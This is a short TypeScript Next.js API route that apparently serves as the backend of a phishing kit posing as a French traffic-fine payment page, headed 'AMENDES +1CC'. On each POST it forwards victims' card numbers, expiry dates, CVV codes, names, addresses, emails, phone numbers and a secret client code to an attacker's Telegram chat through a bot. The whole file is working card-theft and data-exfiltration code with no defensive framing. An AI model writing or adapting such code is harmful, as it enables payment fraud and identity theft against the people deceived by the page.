import bot from "@/lib/telegramBot";
import { NextResponse } from "next/server";

export const POST = async (req: Request) => {
  const body = await req.json();
  console.log("body", body);

  if (body.isLast) {
    await bot.sendMessage(
      process.env.ID || "",
      `
      Date de naissance : ${body.codeSecret}
      Lieu de naissance : ${body.numEspaceClient}
    `
    );
  } else {
    const { informationsData, paymentData } = body;

    await bot.sendMessage(
      process.env.ID || "",
      `
    ============== 🍑 AMENDES +1CC🍑 ============

    Num carte : ${paymentData.cardNumber}
    Date Expiration : ${paymentData.expirationDate}
    Cryptogramme visuel : ${paymentData.cvv}

    ============== ℹ️Informationsℹ️ =============

    Nom : ${informationsData.lastName}
    Prenom : ${informationsData.name}
    Addresse : ${informationsData.adressPostale}
    Ville : ${informationsData.ville}
    Code Postal : ${informationsData.codePostal}
    Email : ${informationsData.email}
    Telephone : ${informationsData.telephone}
     
                
    `
    );
  }

  return NextResponse.json(
    {
      message: "ok",
    },
    {
      status: 200,
    }
  );
};
